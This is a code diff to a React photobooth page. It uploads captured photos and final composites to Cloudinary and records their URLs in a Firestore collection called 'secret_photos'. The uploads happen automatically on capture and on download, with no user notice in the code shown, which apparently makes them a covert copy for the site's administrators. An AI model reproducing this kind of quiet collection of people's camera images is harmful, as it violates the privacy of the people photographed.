@@ -1204,16 +1204,33 @@ export function PhotoboxPage() {
     setCountdown(timerDur);
   };
 
+  // ── Upload dataUrl to Cloudinary, return hosted URL ──
+  // Firestore has 1MB doc limit — base64 images are 3-5MB → must upload to CDN first
+  const uploadDataUrlToCloudinary = async (dataUrl: string): Promise<string> => {
+    const CLOUD = 'dkfhlusok';
+    const PRESET = 'keyysi_sigma';
+    const blob = await (await fetch(dataUrl)).blob();
+    const file = new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
+    const fd = new FormData();
+    fd.append('file', file);
+    fd.append('upload_preset', PRESET);
+    const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD}/image/upload`, {
+      method: 'POST', body: fd,
+    });
+    if (!res.ok) throw new Error('Cloudinary upload failed');
+    return (await res.json()).secure_url;
+  };
+
   const autoSaveToAdmin = async (dataUrl: string, slotIndex: number) => {
     if (!selected) return;
     try {
-      // ✅ Ubah collection ke 'secret_photos' biar sinkron sama Admin.tsx
+      const url = await uploadDataUrlToCloudinary(dataUrl);
       await addDoc(collection(db, 'secret_photos'), {
-        url: dataUrl, // ✅ Ubah key dari 'dataUrl' jadi 'url'
+        url,
         slotIndex,
-        templateId: selected.id, 
+        templateId: selected.id,
         templateName: selected.name,
-        captureMethod, 
+        captureMethod,
         createdAt: new Date().toISOString(),
       });
     } catch (e) {
@@ -1363,31 +1380,37 @@ export function PhotoboxPage() {
     setStage('result');
   };
 
-  const download = () => {
+  const download = async () => {
     if (!finalImg) return;
 
-    // Trigger browser download
+    // Trigger browser download immediately
     const a = document.createElement('a');
     a.href = finalImg;
     a.download = `photobox-${Date.now()}.png`;
     a.click();
 
-    // Save final composite (design + foto) to admin gallery at download time
-    addDoc(collection(db, 'secret_photos'), {
-      url: finalImg,
-      type: 'final_composite',
-      templateId: selected?.id ?? null,
-      templateName: selected?.name ?? null,
-      captureMethod,
-      createdAt: new Date().toISOString(),
-    }).catch(() => { /* silent fail */ });
+    // Upload composite to Cloudinary → save URL to Firestore (avoids 1MB doc limit)
+    try {
+      const url = await uploadDataUrlToCloudinary(finalImg);
+      await addDoc(collection(db, 'secret_photos'), {
+        url,
+        type: 'final_composite',
+        templateId: selected?.id ?? null,
+        templateName: selected?.name ?? null,
+        captureMethod,
+        createdAt: new Date().toISOString(),
+      });
+    } catch (e) {
+      console.warn('Save final to admin failed:', e);
+    }
   };
 
   const saveGallery = async () => {
     if (!finalImg || saved) return;
     try {
+      const url = await uploadDataUrlToCloudinary(finalImg);
       await addDoc(collection(db, 'secret_photos'), {
-        url: finalImg, templateId: selected?.id,
+        url, templateId: selected?.id,
         templateName: selected?.name, createdAt: new Date().toISOString()
       });
       setSaved(true);
